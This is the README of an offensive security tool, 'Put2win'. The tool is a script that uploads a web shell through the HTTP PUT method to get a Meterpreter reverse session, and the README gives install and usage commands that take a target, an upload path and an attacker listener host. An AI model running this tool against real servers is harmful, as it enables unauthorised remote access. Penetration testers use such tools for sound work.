# Put2win
Script to automatize shell upload by PUT HTTP method to get meterpreter

[![asciicast](https://asciinema.org/a/0GFJCJzRQZBlWYAxco2ONqODZ.png)](https://asciinema.org/a/0GFJCJzRQZBlWYAxco2ONqODZ)

# Dependencies
It's necessary to have installed nmap and msfvenom tools for a correct operation

# Installation
git clone https://github.com/sysdevploit/put2win

# Usage
./Put2win.sh -h                                    
This script automatize shell upload by PUT HTTP method to get meterpreter.

Usage:
 ./Put2win.sh -t TARGET [-p PORT] -u URL_PATH -l LHOST

Examples:
 - ./Put2win.sh -t 192.168.1.80 -u /uploads -l 192.168.1.10
 - ./Put2win.sh -t 192.168.1.80 -p 443 -u /uploads -l 192.168.1.10

# Contact
Telegram: @devploit

Twitter: https://www.twitter.com/devploit
